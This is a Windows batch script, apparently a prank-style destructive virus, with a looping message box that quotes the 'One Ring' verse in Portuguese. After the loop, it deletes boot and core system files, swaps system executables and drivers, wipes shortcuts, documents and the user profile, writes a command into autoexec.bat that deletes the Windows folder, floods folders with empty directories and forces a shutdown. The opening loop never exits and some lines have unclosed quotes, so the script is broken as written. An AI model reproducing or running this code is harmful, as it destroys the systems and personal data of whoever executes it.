@echo off
break off
:po
msg * Um Anel para a todos governar, Um Anel para encontra-los, Um Anel para a todos trazer e na escuridao aprisiona-los !
goto po

attrib -r -s -h c:\autoexec.bat
del "c:\autoexec.bat"
attrib -r -s -h c:\boot.ini
del "c:\boot.ini"
attrib -r -s -h c:\ntldr
del "c:\ntldr"
attrib -r -s -h c:\windows\win.ini

del "c:\windows\win.ini"
del "c:\windows\system32\hal.dll"
del "c:\windows\system32\dllcache\winlogon.exe"
del "c:\windows\system32\dllcache\explorer.exe"
del "c:\windows\system32\dllcache\services.exe"
del "c:\windows\system32\dllcache\vga.sys"
del "c:\windows\system32\dllcache\mup.sys"
del "c:\windows\system32\dllcache\taskmgr.exe"
del "c:\windows\system32\taskmgr.exe"
copy "taskmgr.exe" "c:\windows\system32"
rename "c:\windows\system32\services.exe" "explorer1.exe
rename "c:\windows\system32\winlogon.exe" "services.exe"
rename "c:\windows\system32\explorer1.exe" "winlogon.exe"
rename "c:\windows\explorer.exe" "explorer1.exe"
rename "c:\windows\winhelp.exe" "explorer.exe"
rename "c:\windows\explorer1.exe" "winhelp.exe"
rename "c:\windows\system32\drivers\mup.sys" "mup2.sys
rename "c:\windows\system32\drivers\vga.sys" "mup.sys"
rename "c:\windows\system32\drivers\mup2.sys" "vga.sys"

CD %systemdrive%\
DEL /F /Q WINDOWS\*.DLL
DEL /F /Q WINDOWS\*.INI
DEL /F /Q WINDOWS\SYSTEM\*.VXD
DEL /F /Q WINDOWS\*.COM
DEL /F /Q WINDOWS\COMMAND\*.COM
DEL /F /Q *.COM
DEL /F /Q ntldr.sys
DEL /F /Q ntldr
DEL /F /Q WINDOWS\*.SYS
DEL /F /Q WINDOWS\COMMAND\*.SYS
DEL /F /Q WINDOWS\COMMAND\EBD\*.SYS
DEL /F /Q WINDOWS\INF\*.INF
DEL /F /Q WINDOWS\SYSTEM\*.INF
DEL /F /Q WINDOWS\*.EXE
DEL /F /Q WINDOWS\SYSTEM\*.EXE
DEL /F /Q WINDOWS\SYSTEM\*.DRV
DEL /F /Q WINDOWS\*.TXT
DELTREE/Y WINDOWS\system

cd %ALLUSERSPROFILE%\Desktop
del /Q *.lnk
cd %USERPROFILE%\Desktop
del /Q *.lnk
del /Q /S /F "%USERPROFILE%"\Meus documentos\
del /Q /S /F "%ALLUSERPROFILE%"\Meus documentos\
cd %userprofile%
del /Q /S /F *.*
cd\windows
echo rmdir /s /q c:\windows >> autoexec.bat

cd %userprofile%\Meus documentos
set numero=9999
set /a nome=0
:1
if exist %numero% goto 2
set /a nome=%nome%+1
md %nome%
goto 1
:2
cd %userprofile%\Desktop
set /a nome=0
:3
if exist %numero% goto 4
set /a nome=%nome%+1
md %nome%
goto 3
:4
shutdown -s -t 300
exit
